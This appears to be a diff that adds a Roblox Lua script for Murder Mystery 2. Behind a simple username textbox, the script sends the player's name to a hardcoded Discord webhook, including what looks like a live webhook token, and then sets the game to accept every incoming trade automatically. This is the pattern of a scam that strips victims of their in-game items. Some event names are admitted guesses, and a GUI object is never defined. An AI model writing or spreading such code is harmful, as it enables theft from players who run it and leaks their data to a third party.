@@ -1,0 +1,36 @@
+local HttpService = game:GetService("HttpService")
+local TradeService = game:GetService("ReplicatedStorage"):WaitForChild("TradeService") -- Adjust based on MM2's system
+
+-- Replace with your Discord webhook URL
+local webhookURL = "https://discord.com/api/webhooks/1295679259427344425/0XbQu7noGpTA0wfQqg3MVYCcVIiFAXnE640x4VlhsMYaOhi7Gx2KDotJmFJ0GmpfNfD0"
+
+local player = game.Players.LocalPlayer
+
+-- Function to send username to the Discord webhook
+local function sendUsernameToWebhook(username)
+    local data = {
+        ["content"] = "New Username Entered: " .. username .. " has joined MM2!"
+    }
+    local jsonData = HttpService:JSONEncode(data)
+    HttpService:PostAsync(webhookURL, jsonData, Enum.HttpContentType.ApplicationJson)
+    print("Username sent to webhook")
+end
+
+-- Function to auto-accept trades (adjust this based on MM2's trade event structure)
+local function autoAcceptTrades()
+    TradeService.TradeRequest.OnClientEvent:Connect(function(tradeData)
+        -- Automatically accept the trade
+        TradeService:FireServer("AcceptTrade", tradeData) -- Replace with the correct function call for MM2
+        print("Trade auto-accepted for " .. player.Name .. "!")
+    end)
+end
+
+-- Create a textbox for username input
+local usernameInput = tab1:CreateTextbox("Enter Username", "Type here...", true, function(username)
+    if username == player.Name then
+        sendUsernameToWebhook(username) -- Send the username to the webhook
+        autoAcceptTrades() -- Enable auto-accept trades
+    else
+        print("Incorrect Username")
+    end
+end)
